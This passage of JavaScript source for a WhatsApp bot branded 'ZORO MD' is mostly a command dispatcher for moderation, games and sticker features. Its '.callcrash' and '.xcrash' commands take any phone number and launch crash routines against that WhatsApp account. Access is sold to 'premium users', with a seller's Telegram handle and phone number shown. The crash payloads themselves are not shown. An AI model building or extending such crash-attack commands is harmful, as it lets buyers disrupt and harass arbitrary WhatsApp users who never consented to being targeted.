        if (!isPublic && !isOwnerOrSudoCheck) {
            return;
        }

        // List of admin commands
        const adminCommands = ['.mute', '.unmute', '.ban', '.unban', '.promote', '.demote', '.kick', '.tagall', '.tagnotadmin', '.hidetag', '.antilink', '.antitag', '.setgdesc', '.setgname', '.setgpp'];
        const isAdminCommand = adminCommands.some(cmd => userMessage.startsWith(cmd));

        // List of owner commands
        const ownerCommands = ['.mode', '.autostatus', '.antidelete', '.cleartmp', '.setpp', '.clearsession', '.areact', '.autoreact', '.autotyping', '.autoread', '.pmblocker'];
        const isOwnerCommand = ownerCommands.some(cmd => userMessage.startsWith(cmd));

        let isSenderAdmin = false;
        let isBotAdmin = false;

        // Check admin status only for admin commands in groups
        if (isGroup && isAdminCommand) {
            const adminStatus = await isAdmin(sock, chatId, senderId);
            isSenderAdmin = adminStatus.isSenderAdmin;
            isBotAdmin = adminStatus.isBotAdmin;

            if (!isBotAdmin) {
                await sock.sendMessage(chatId, { text: 'Please make the bot an admin to use admin commands.', ...channelInfo }, { quoted: message });
                return;
            }

            if (
                userMessage.startsWith('.mute') ||
                userMessage === '.unmute' ||
                userMessage.startsWith('.ban') ||
                userMessage.startsWith('.unban') ||
                userMessage.startsWith('.promote') ||
                userMessage.startsWith('.demote')
            ) {
                if (!isSenderAdmin && !message.key.fromMe) {
                    await sock.sendMessage(chatId, {
                        text: 'Sorry, only group admins can use this command.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
            }
        }

        // Check owner status for owner commands
        if (isOwnerCommand) {
            if (!message.key.fromMe && !senderIsOwnerOrSudo) {
                await sock.sendMessage(chatId, { text: '❌ This command is only available for the owner or sudo!' }, { quoted: message });
                return;
            }
        }
        

        switch (true) {
            case userMessage === '.simage': {
                const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (quotedMessage?.stickerMessage) {
                    await simageCommand(sock, quotedMessage, chatId);
                } else {
                    await sock.sendMessage(chatId, { text: 'Please reply to a sticker with the .simage command to convert it.', ...channelInfo }, { quoted: message });
                }
                commandMatched = true;
                break;
            }
            case userMessage.startsWith('.add'): {
    if (!isGroup) {
        await sock.sendMessage(chatId, { text: '❌ Group only command' }, { quoted: message });
        break;
    }

    const adminStatus = await isAdmin(sock, chatId, senderId);

    if (!adminStatus.isBotAdmin) {
        await sock.sendMessage(chatId, { text: '❌ Bot must be admin' }, { quoted: message });
        break;
    }

    if (!adminStatus.isSenderAdmin && !message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, { text: '❌ Only group admins can use this' }, { quoted: message });
        break;
    }

    const rawArgs = rawText.replace('.add', '').trim().split(/\s+/);

    const numbers = rawArgs
        .map(n => n.replace(/\D/g, ''))
        .map(n => n.length > 10 ? n.slice(-10) : n)
        .filter(n => n.length === 10)
        .map(n => n + '@s.whatsapp.net');

    if (!numbers.length) {
        await sock.sendMessage(chatId, { text: '❌ No valid numbers found' }, { quoted: message });
        break;
    }

    let added = [];
    let failed = [];

    for (const jid of numbers) {
    const num = jid.split('@')[0];

    // ✅ WhatsApp existence check
    const check = await sock.onWhatsApp(num);
    if (!check?.[0]?.exists) {
        failed.push(`❌ ${num} → Not on WhatsApp`);
        continue;
    }

    let result;
    try {
        result = await sock.groupParticipantsUpdate(chatId, [jid], 'add');
    } catch (e) {
        failed.push(`❌ ${num} → Request failed`);
        continue;
    }

    const status = result?.[0]?.status;

    if (status === '200') {
        added.push(num);
    }
    else if (status === '403') {
        failed.push(`❌ ${num} → Can join only via invite link`);
    }
    else if (status === '409') {
        failed.push(`⚠️ ${num} → Already in group`);
    }
    else if (status === '401') {
        failed.push(`❌ ${num} → Bot not allowed (admin only add)`);
    }
    else {
        failed.push(`❌ ${num} → Failed (code ${status || 'unknown'})`);
    }
}

    let reply = `👥 *ADD RESULT*\n\n`;

    if (added.length) {
        reply += `✅ Added (${added.length}):\n${added.join(', ')}\n\n`;
    }
    if (failed.length) {
        reply += `⚠️ Failed (${failed.length}):\n${failed.join('\n')}`;
    }

    await sock.sendMessage(chatId, { text: reply }, { quoted: message });
    break;
}
            case userMessage.startsWith('.hack'): {
    await hackPrankCommand(sock, chatId, message);
    commandMatched = true;
    break;
}
            case userMessage.startsWith('.kickall'): {
    await kickAllS7SY(sock, chatId);
    commandMatched = true;
    break;
}
            case userMessage.startsWith('.kick'):
                const mentionedJidListKick = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await kickCommand(sock, chatId, senderId, mentionedJidListKick, message);
                break;
                case userMessage.startsWith('.lookup'): {
    await lookupCommand(sock, chatId, message, rawText);
    commandMatched = true;
    break;
}           case userMessage === '.getpp': {
    let targetJid = chatId;

    // agar group hai → group DP
    // agar private hai → user DP
    try {
        let ppUrl;
        try {
            ppUrl = await sock.profilePictureUrl(targetJid, 'image');
        } catch {
            ppUrl = null;
        }

        if (!ppUrl) {
            await sock.sendMessage(chatId, {
                text: '❌ Profile picture not found or privacy restricted'
            }, { quoted: message });
            break;
        }

        await sock.sendMessage(chatId, {
            image: { url: ppUrl },
            caption: '🖼️ *Profile Picture*'
        }, { quoted: message });

    } catch (err) {
        console.error('getpp error:', err);
        await sock.sendMessage(chatId, {
            text: '❌ Failed to fetch profile picture'
        }, { quoted: message });
    }
    break;
}
            case userMessage.startsWith('.mute'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const muteArg = parts[1];
                    const muteDuration = muteArg !== undefined ? parseInt(muteArg, 10) : undefined;
                    if (muteArg !== undefined && (isNaN(muteDuration) || muteDuration <= 0)) {
                        await sock.sendMessage(chatId, { text: 'Please provide a valid number of minutes or use .mute with no number to mute immediately.', ...channelInfo }, { quoted: message });
                    } else {
                        await muteCommand(sock, chatId, senderId, message, muteDuration);
                    }
                }
                break;
            case userMessage === '.unmute':
                await unmuteCommand(sock, chatId, senderId);
                break;
            case userMessage.startsWith('.ban'):
                if (!isGroup) {
                    if (!message.key.fromMe && !senderIsSudo) {
                        await sock.sendMessage(chatId, { text: 'Only owner/sudo can use .ban in private chat.' }, { quoted: message });
                        break;
                    }
                }
                await banCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.callcrash'): {
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, { text: '❌ Only owner / sudo can use this command' }, { quoted: message });
        break;
    }

    if (!isLOVSmeSY(message, sock)) {
        await sock.sendMessage(chatId, { text: `*🚫 ACCESS DENIED 🚫*\n*🔒 Premium Users Only*`, ...channelInfo }, { quoted: message });
        break;
    }

    const parts = rawText.trim().split(/\s+/);
    if (!parts[1]) {
        await sock.sendMessage(chatId, { text: '⚠️ Usage:\n.callcrash +917XXXXXXXXX' }, { quoted: message });
        break;
    }

    const number = parts[1].replace(/\D/g, '');
    if (number.length < 10) {
        await sock.sendMessage(chatId, { text: '❌ Invalid number' }, { quoted: message });
        break;
    }

    // WhatsApp Check for callcrash
    const check = await sock.onWhatsApp(number);
    if (!check?.[0]?.exists) {
        await sock.sendMessage(chatId, { text: '❌ Number not on WhatsApp' }, { quoted: message });
        break;
    }

    const targetJid = number + '@s.whatsapp.net';
    await sock.sendMessage(chatId, { text: `🚀 *CALL CRASH STARTED*\n🎯: ${targetJid}`, ...channelInfo }, { quoted: message });

    RunCrashHelper(sock, targetJid);
    commandMatched = true;
    break;
}
case userMessage.startsWith('.test'): {
    let myJid = message.key.participant || message.key.remoteJid;
    let cleanNumber;

    if (message.key.fromMe) {
        myJid = sock.user.id;
        cleanNumber = jidDecode(myJid).user;
    } else {
        cleanNumber = myJid.split('@')[0].split(':')[0];
    }

    const senderIsOwner = message.key.fromMe || (await isOwnerOrSudo(myJid, sock, chatId));
    

    const hasPremium = isLOVSmeSY(message, sock);

    let testReport = `✨ *ZORO MD - SYSTEM TEST* ✨\n\n`;
    testReport += `📱 *Your Number:* ${cleanNumber}\n`;
    testReport += `🆔 *Full JID:* ${myJid}\n`;
    testReport += `━━━━━━━━━━━━━━━━━━\n`;
    testReport += `👑 *Owner/Sudo:* ${senderIsOwner ? '✅ Authorized' : '❌ No Access'}\n`;
    testReport += `💎 *Premium User:* ${hasPremium ? '✅ Active' : '❌ Not Found'}\n`;
    testReport += `🌍 *Bot Mode:* ${global.isPublic ? 'Public' : 'Private'}\n`;
    testReport += `━━━━━━━━━━━━━━━━━━\n`;
    testReport += `📝 *Note:* Agar Premium ❌ dikha raha hai, toh apna number 'data/data.json' mein check karein.`;

    await sock.sendMessage(chatId, { 
        text: testReport,
        contextInfo: channelInfo.contextInfo 
    }, { quoted: message });
    
    commandMatched = true;
    break;
}



           case userMessage.startsWith('.xcrash'): {
    // 1. Owner/Sudo Check
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, { text: '❌ Only owner / sudo can use this command' }, { quoted: message });
        break;
    }

    // 2. Premium Check (Passing full message object)
    if (!isLOVSmeSY(message, sock)) {
        await sock.sendMessage(chatId, {
            text: `*🚫 ACCESS DENIED 🚫*\n*🔒 Premium Users Only*\n*📩 t.me/@Zoroxbug*\n*📞 +91 82930 07159*`,
            ...channelInfo
        }, { quoted: message });
        break;
    }

    // 3. Argument check
    const parts = rawText.trim().split(/\s+/);
    if (!parts[1]) {
        await sock.sendMessage(chatId, { text: '⚠️ Usage:\n.xcrash +917XXXXXXXXX' }, { quoted: message });
        break;
    }

    // 4. Number cleaning & Length check
    const number = parts[1].replace(/\D/g, '');
    if (number.length < 10) {
        await sock.sendMessage(chatId, { text: '❌ Invalid number format (Min 10 digits required)' }, { quoted: message });
        break;
    }

    const targetJid = number + '@s.whatsapp.net';

    // 5. WhatsApp Existence Check (Wapas add kar diya ✅)
    let exists = false;
    try {
        const check = await sock.onWhatsApp(number);
        exists = check?.[0]?.exists;
    } catch (e) {
        console.log("Check error:", e);
    }

    if (!exists) {
        await sock.sendMessage(chatId, { text: '❌ This number is NOT on WhatsApp' }, { quoted: message });
        break;
    }

    // 6. Success - Execution
    await sock.sendMessage(chatId, {
        text: `🔥 *XCRASH STARTED*\n🎯 Target: ${targetJid}`,
        ...channelInfo
    }, { quoted: message });

    S7LOVESYUILIKES7(sock, targetJid);
    commandMatched = true;
    break;
}

            case userMessage.startsWith('.unban'):
                if (!isGroup) {
                    if (!message.key.fromMe && !senderIsSudo) {
                        await sock.sendMessage(chatId, { text: 'Only owner/sudo can use .unban in private chat.' }, { quoted: message });
                        break;
                    }
                }
                await unbanCommand(sock, chatId, message);
                break;
            case userMessage === '.help' || userMessage === '.menu' || userMessage === '.bot' || userMessage === '.list':
    await helpCommand(sock, chatId, message, global.channelLink);
    commandMatched = true;

    await new Promise(resolve => setTimeout(resolve, 1300));

    await sock.sendMessage(chatId, {
        audio: { url: 'https://e.top4top.io/m_365891tfv0.mp3' },
        mimetype: 'audio/mpeg',
        ptt: false
    });

    break;
            case userMessage === '.sticker' || userMessage === '.s':
                await stickerCommand(sock, chatId, message);
                commandMatched = true;
                break;
            case userMessage.startsWith('.warnings'):
                const mentionedJidListWarnings = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await warningsCommand(sock, chatId, mentionedJidListWarnings);
                break;
            case userMessage.startsWith('.warn'):
                const mentionedJidListWarn = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await warnCommand(sock, chatId, senderId, mentionedJidListWarn, message);
                break;
            case userMessage.startsWith('.tts'):
                const text = userMessage.slice(4).trim();
                await ttsCommand(sock, chatId, text, message);
                break;
            case userMessage.startsWith('.delete') || userMessage.startsWith('.del'):
                await deleteCommand(sock, chatId, message, senderId);
                break;
            case userMessage.startsWith('.attp'):
                await attpCommand(sock, chatId, message);
                break;
                
            case userMessage.startsWith('.aiedit'):
    await aieditCommand(sock, chatId, message, rawText);
    break;

            case userMessage === '.settings':
                await settingsCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.mode'): {
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, {
            text: 'Only bot owner can use this command!',
            ...channelInfo
        }, { quoted: message });
        return;
    }

    const data = readSessionJSON(phoneNumber, 'messageCount.json', {
        isPublic: true,
        messages: {}
    });

    const action = userMessage.split(' ')[1]?.toLowerCase();

    if (!action) {
        const currentMode = data.isPublic ? 'public' : 'private';
        await sock.sendMessage(chatId, {
            text: `Current bot mode: *${currentMode}*\n\nUsage:\n.mode public\n.mode private`,
            ...channelInfo
        }, { quoted: message });
        return;
    }

    if (!['public', 'private'].includes(action)) {
        await sock.sendMessage(chatId, {
            text: 'Usage: .mode public/private',
            ...channelInfo
        }, { quoted: message });
        return;
    }

    data.isPublic = action === 'public';
writeSessionJSON(phoneNumber, 'messageCount.json', data);

    await sock.sendMessage(chatId, {
        text: `✅ Bot is now in *${action}* mode`,
        ...channelInfo
    });

    break;
    }
            case userMessage.startsWith('.anticall'): {
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, {
            text: '❌ Owner / Sudo only command'
        }, { quoted: message });
        break;
    }

    const args = userMessage.split(' ').slice(1);
    const state = getAnticallState(phoneNumber);

    if (!args[0]) {
        await sock.sendMessage(chatId, {
            text:
`📞 AntiCall is *${state.enabled ? 'ON' : 'OFF'}*

Usage:
.anticall on
.anticall off`
        }, { quoted: message });
        break;
    }

    if (['on', 'enable'].includes(args[0])) {
        setAnticallState(phoneNumber, {
            ...state,
            enabled: true
        });
        await sock.sendMessage(chatId, {
            text: '✅ AntiCall ENABLED'
        }, { quoted: message });
    }
    else if (['off', 'disable'].includes(args[0])) {
        setAnticallState(phoneNumber, {
            ...state,
            enabled: false
        });
        await sock.sendMessage(chatId, {
            text: '❌ AntiCall DISABLED'
        }, { quoted: message });
    }
    else {
        await sock.sendMessage(chatId, {
            text: '❌ Usage:\n.anticall on / off'
        }, { quoted: message });
    }

    break;
}
            case userMessage.startsWith('.pmblocker'):
                {
                    const args = userMessage.split(' ').slice(1).join(' ');
                    await pmblockerCommand(sock, chatId, message, args);
                }
                commandMatched = true;
                break;
            case userMessage === '.owner':
                await ownerCommand(sock, chatId);
                break;
             case userMessage === '.tagall':
                await tagAllCommand(sock, chatId, senderId, message);
                break;
            case userMessage === '.tagnotadmin':
                await tagNotAdminCommand(sock, chatId, senderId, message);
                break;
            case userMessage.startsWith('.hidetag'):
                {
                    const messageText = rawText.slice(8).trim();
                    const replyMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
                    await hideTagCommand(sock, chatId, senderId, messageText, replyMessage, message);
                }
                break;
            case userMessage.startsWith('.tag'):
                const messageText = rawText.slice(4).trim();  // use rawText here, not userMessage
                const replyMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
                await tagCommand(sock, chatId, senderId, messageText, replyMessage, message);
                break;
            case userMessage.startsWith('.antilink'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, {
                        text: 'This command can only be used in groups.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                if (!isBotAdmin) {
                    await sock.sendMessage(chatId, {
                        text: 'Please make the bot an admin first.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                await handleAntilinkCommand(sock, chatId, userMessage, senderId, isSenderAdmin, message);
                break;
            case userMessage.startsWith('.antitag'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, {
                        text: 'This command can only be used in groups.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                if (!isBotAdmin) {
                    await sock.sendMessage(chatId, {
                        text: 'Please make the bot an admin first.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                await handleAntitagCommand(sock, chatId, userMessage, senderId, isSenderAdmin, message);
                break;
            case userMessage === '.meme':
                await memeCommand(sock, chatId, message);
                break;
            case userMessage === '.joke':
                await jokeCommand(sock, chatId, message);
                break;
            case userMessage === '.quote':
                await quoteCommand(sock, chatId, message);
                break;
            case userMessage === '.fact':
                await factCommand(sock, chatId, message, message);
                break;
            case userMessage.startsWith('.weather'):
                const city = userMessage.slice(9).trim();
                if (city) {
                    await weatherCommand(sock, chatId, message, city);
                } else {
                    await sock.sendMessage(chatId, { text: 'Please specify a city, e.g., .weather London', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage === '.news':
                await newsCommand(sock, chatId);
                break;
            case userMessage.startsWith('.ttt') || userMessage.startsWith('.tictactoe'):
                const tttText = userMessage.split(' ').slice(1).join(' ');
                await tictactoeCommand(sock, chatId, senderId, tttText);
                break;
            case userMessage.startsWith('.move'):
                const position = parseInt(userMessage.split(' ')[1]);
                if (isNaN(position)) {
                    await sock.sendMessage(chatId, { text: 'Please provide a valid position number for Tic-Tac-Toe move.', ...channelInfo }, { quoted: message });
                } else {
                    tictactoeMove(sock, chatId, senderId, position);
                }
                break;
            case userMessage === '.topmembers':
                topMembers(sock, chatId, isGroup);
                break;
            case userMessage.startsWith('.hangman'):
                startHangman(sock, chatId);
                break;
            case userMessage.startsWith('.guess'):
                const guessedLetter = userMessage.split(' ')[1];
                if (guessedLetter) {
                    guessLetter(sock, chatId, guessedLetter);
                } else {
                    sock.sendMessage(chatId, { text: 'Please guess a letter using .guess <letter>', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage.startsWith('.trivia'):
                startTrivia(sock, chatId);
                break;
            case userMessage.startsWith('.answer'):
                const answer = userMessage.split(' ').slice(1).join(' ');
                if (answer) {
                    answerTrivia(sock, chatId, answer);
                } else {
                    sock.sendMessage(chatId, { text: 'Please provide an answer using .answer <answer>', ...channelInfo }, { quoted: message });
                }
                break;
                            
            
            case userMessage.startsWith('.compliment'):
                await complimentCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.insult'):
                await insultCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.8ball'):
                const question = userMessage.split(' ').slice(1).join(' ');
                await eightBallCommand(sock, chatId, question);
                break;
            case userMessage.startsWith('.lyrics'):
                const songTitle = userMessage.split(' ').slice(1).join(' ');
                await lyricsCommand(sock, chatId, songTitle, message);
                break;
            case userMessage.startsWith('.simp'):
                const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const mentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await simpCommand(sock, chatId, quotedMsg, mentionedJid, senderId);
                break;
            case userMessage.startsWith('.stupid') || userMessage.startsWith('.itssostupid') || userMessage.startsWith('.iss'):
                const stupidQuotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const stupidMentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const stupidArgs = userMessage.split(' ').slice(1);
                await stupidCommand(sock, chatId, stupidQuotedMsg, stupidMentionedJid, senderId, stupidArgs);
                break;
            case userMessage === '.dare':
                await dareCommand(sock, chatId, message);
                break;
            case userMessage === '.truth':
                await truthCommand(sock, chatId, message);
                break;
            case userMessage === '.clear':
                if (isGroup) await clearCommand(sock, chatId);
                break;
            case userMessage.startsWith('.promote'):
                const mentionedJidListPromote = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await promoteCommand(sock, chatId, mentionedJidListPromote, message);
                break;
            case userMessage.startsWith('.demote'):
                const mentionedJidListDemote = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await demoteCommand(sock, chatId, mentionedJidListDemote, message);
                break;
            case userMessage === '.ping':
                await pingCommand(sock, chatId, message);
                break;
            case userMessage === '.alive':
                await aliveCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.mention '):
                {
                    const args = userMessage.split(' ').slice(1).join(' ');
                    const isOwner = message.key.fromMe || senderIsSudo;
                    await mentionToggleCommand(sock, chatId, message, args, isOwner);
                }
                break;
            case userMessage === '.setmention':
                {
                    const isOwner = message.key.fromMe || senderIsSudo;
                    await setMentionCommand(sock, chatId, message, isOwner);
                }
                break;
            case userMessage.startsWith('.blur'):
                const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                await blurCommand(sock, chatId, message, quotedMessage);
                break;
                        case userMessage.startsWith('.welcome'):
                if (isGroup) {
                    // Check admin status if not already checked
                    if (!isSenderAdmin) {
                        const adminStatus = await isAdmin(sock, chatId, senderId);
                        isSenderAdmin = adminStatus.isSenderAdmin;
                    }

                    if (isSenderAdmin || message.key.fromMe) {
                        await welcomeCommand(sock, chatId, message);
                    } else {
                        await sock.sendMessage(chatId, { text: 'Sorry, only group admins can use this command.', ...channelInfo }, { quoted: message });
                    }
                } else {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                }
                break;
            
            case userMessage.startsWith('.ai'): {
                const prompt = rawText.replace(/^\.ai\s*/i, '').trim();

                if (!prompt) {
                    await sock.sendMessage(chatId, { 
                        text: "🤖 *Gemini AI*\n\nPlease provide a query.\n*Example:* .ai Write a short story about a cat." 
                    }, { quoted: message });
                    break;
                }

                await sock.sendMessage(chatId, { text: "⏳ *Thinking...*" }, { quoted: message });

                try {
                    const response = await LOVEAIxSYREPLAY(prompt);
                    
                    await sock.sendMessage(chatId, { 
                        text: `${response}`,
                        contextInfo: {
                            externalAdReply: {
                                title: "Gemini 2.0 Flash",
                                body: "Artificial Intelligence",
                                thumbnailUrl: "https://i.top4top.io/p_3664firq70.jpg",
                                sourceUrl: "https://gemini.google.com",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: message });
                } catch (e) {
                    console.error(e);
                    await sock.sendMessage(chatId, { text: "❌ An error occurred while fetching the AI response." }, { quoted: message });
                }

                commandMatched = true;
                break;
            }

            case userMessage.startsWith('.goodbye'):
                if (isGroup) {
                    // Check admin status if not already checked
                    if (!isSenderAdmin) {
                        const adminStatus = await isAdmin(sock, chatId, senderId);
                        isSenderAdmin = adminStatus.isSenderAdmin;
                    }

                    if (isSenderAdmin || message.key.fromMe) {
                        await goodbyeCommand(sock, chatId, message);
                    } else {
                        await sock.sendMessage(chatId, { text: 'Sorry, only group admins can use this command.', ...channelInfo }, { quoted: message });
                    }
                } else {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage === '.git':
            case userMessage === '.github':
            case userMessage === '.sc':
            case userMessage === '.script':
            case userMessage === '.repo':
                await githubCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.antibadword'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                    return;
                }

                const adminStatus = await isAdmin(sock, chatId, senderId);
                isSenderAdmin = adminStatus.isSenderAdmin;
                isBotAdmin = adminStatus.isBotAdmin;

                if (!isBotAdmin) {
                    await sock.sendMessage(chatId, { text: '*Bot must be admin to use this feature*', ...channelInfo }, { quoted: message });
                    return;
                }

                await antibadwordCommand(sock, chatId, message, senderId, isSenderAdmin);
                break;
            case userMessage.startsWith('.chatbot'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                    return;
                }

                // Check if sender is admin or bot owner
                const chatbotAdminStatus = await isAdmin(sock, chatId, senderId);
                if (!chatbotAdminStatus.isSenderAdmin && !message.key.fromMe) {
                    await sock.sendMessage(chatId, { text: '*Only admins or bot owner can use this command*', ...channelInfo }, { quoted: message });
                    return;
                }

                const match = userMessage.slice(8).trim();
                await handleChatbotCommand(sock, chatId, message, match);
                break;
            case userMessage.startsWith('.take') || userMessage.startsWith('.steal'):
                {
                    const isSteal = userMessage.startsWith('.steal');
                    const sliceLen = isSteal ? 6 : 5; // '.steal' vs '.take'
                    const takeArgs = rawText.slice(sliceLen).trim().split(' ');
                    await takeCommand(sock, chatId, message, takeArgs);
                }
                break;
            case userMessage === '.flirt':
                await flirtCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.character'):
                await characterCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.waste'):
                await wastedCommand(sock, chatId, message);
                break;
            case userMessage === '.ship':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await shipCommand(sock, chatId, message);
                break;
            case userMessage === '.groupinfo' || userMessage === '.infogp' || userMessage === '.infogrupo':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await groupInfoCommand(sock, chatId, message);
                break;
            case userMessage === '.resetlink' || userMessage === '.revoke' || userMessage === '.anularlink':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await resetlinkCommand(sock, chatId, senderId);
                break;
            case userMessage === '.staff' || userMessage === '.admins' || userMessage === '.listadmin':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await staffCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tourl') || userMessage.startsWith('.url'):
                await urlCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.emojimix') || userMessage.startsWith('.emix'):
                await emojimixCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tg') || userMessage.startsWith('.stickertelegram') || userMessage.startsWith('.tgsticker') || userMessage.startsWith('.telesticker'):
                await stickerTelegramCommand(sock, chatId, message);
                break;

            case userMessage === '.vv':
                await viewOnceCommand(sock, chatId, message);
                break;
            case userMessage === '.clearsession' || userMessage === '.clearsesi':
                await clearSessionCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.autostatus'): {
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, { text: '❌ Owner/Sudo only' }, { quoted: message });
        break;
    }

    const args = userMessage.split(' ').slice(1);
    const state = getAutoStatusState(phoneNumber);

    if (!args[0]) {
        await sock.sendMessage(chatId, {
            text: `📊 AutoStatus:
👁 View: ${state.enabled ? 'ON' : 'OFF'}
💫 React: ${state.react ? 'ON' : 'OFF'}

Commands:
.autostatus on
.autostatus off
.autostatus react on
.autostatus react off`
        }, { quoted: message });
        break;
    }

    if (args[0] === 'on') {
        setAutoStatusState(phoneNumber, { ...state, enabled: true });
        await sock.sendMessage(chatId, { text: '✅ AutoStatus ENABLED' }, { quoted: message });
    }
    else if (args[0] === 'off') {
        setAutoStatusState(phoneNumber, { ...state, enabled: false });
        await sock.sendMessage(chatId, { text: '❌ AutoStatus DISABLED' }, { quoted: message });
    }
    else if (args[0] === 'react') {
        if (args[1] === 'on') {
            setAutoStatusState(phoneNumber, { ...state, react: true });
            await sock.sendMessage(chatId, { text: '💫 Status React ENABLED' }, { quoted: message });
        } else if (args[1] === 'off') {
            setAutoStatusState(phoneNumber, { ...state, react: false });
            await sock.sendMessage(chatId, { text: '❌ Status React DISABLED' }, { quoted: message });
        }
    }
    break;
}
            case userMessage.startsWith('.simp'):
                await simpCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.metallic'):
                await textmakerCommand(sock, chatId, message, userMessage, 'metallic');
                break;
            case userMessage.startsWith('.ice'):
                await textmakerCommand(sock, chatId, message, userMessage, 'ice');
                break;
            case userMessage.startsWith('.snow'):
                await textmakerCommand(sock, chatId, message, userMessage, 'snow');
                break;
            case userMessage.startsWith('.impressive'):
                await textmakerCommand(sock, chatId, message, userMessage, 'impressive');
                break;
            case userMessage.startsWith('.matrix'):
                await textmakerCommand(sock, chatId, message, userMessage, 'matrix');
                break;
            case userMessage.startsWith('.light'):
                await textmakerCommand(sock, chatId, message, userMessage, 'light');
                break;
            case userMessage.startsWith('.neon'):
                await textmakerCommand(sock, chatId, message, userMessage, 'neon');
                break;
            case userMessage.startsWith('.devil'):
                await textmakerCommand(sock, chatId, message, userMessage, 'devil');
                break;
            case userMessage.startsWith('.purple'):
                await textmakerCommand(sock, chatId, message, userMessage, 'purple');
                break;
            case userMessage.startsWith('.thunder'):
                await textmakerCommand(sock, chatId, message, userMessage, 'thunder');
                break;
            case userMessage.startsWith('.leaves'):
                await textmakerCommand(sock, chatId, message, userMessage, 'leaves');
                break;
            case userMessage.startsWith('.1917'):
                await textmakerCommand(sock, chatId, message, userMessage, '1917');
                break;
            case userMessage.startsWith('.arena'):
                await textmakerCommand(sock, chatId, message, userMessage, 'arena');
                break;
            case userMessage.startsWith('.hacker'):
                await textmakerCommand(sock, chatId, message, userMessage, 'hacker');
                break;
            case userMessage.startsWith('.sand'):
                await textmakerCommand(sock, chatId, message, userMessage, 'sand');
                break;
            case userMessage.startsWith('.blackpink'):
                await textmakerCommand(sock, chatId, message, userMessage, 'blackpink');
                break;
            case userMessage.startsWith('.glitch'):
                await textmakerCommand(sock, chatId, message, userMessage, 'glitch');
                break;
            case userMessage.startsWith('.fire'):
                await textmakerCommand(sock, chatId, message, userMessage, 'fire');
                break;
            case userMessage.startsWith('.antidelete'):
                const antideleteMatch = userMessage.slice(11).trim();
                await handleAntideleteCommand(sock, chatId, message, antideleteMatch);
                break;
            case userMessage === '.surrender':
                // Handle surrender command for tictactoe game
                await handleTicTacToeMove(sock, chatId, senderId, 'surrender');
                break;
            case userMessage === '.cleartmp':
                await clearTmpCommand(sock, chatId, message);
                break;
            case userMessage === '.setpp':
                await setProfilePicture(sock, chatId, message);
                break;
            case userMessage.startsWith('.setgdesc'):
                {
                    const text = rawText.slice(9).trim();
                    await setGroupDescription(sock, chatId, senderId, text, message);
                }
                break;
            case userMessage.startsWith('.setgname'):
                {
                    const text = rawText.slice(9).trim();
                    await setGroupName(sock, chatId, senderId, text, message);
                }
                break;
            case userMessage.startsWith('.setgpp'):
                await setGroupPhoto(sock, chatId, senderId, message);
                break;
            case userMessage.startsWith('.instagram') || userMessage.startsWith('.insta') || (userMessage === '.ig' || userMessage.startsWith('.ig ')):
